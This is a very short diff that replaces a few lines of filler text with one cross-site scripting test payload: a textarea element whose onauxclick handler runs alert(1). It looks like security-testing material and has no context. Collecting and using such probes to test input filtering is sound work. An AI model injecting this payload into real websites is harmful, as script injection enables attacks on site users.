@@ -1,5 +1,1 @@
-execCommand('sd
-')
-afadsf
-asdfadsfadsfds
-dsafasdfdsafdsaf
+<textarea onauxclick=alert(1)>XSS</textarea>
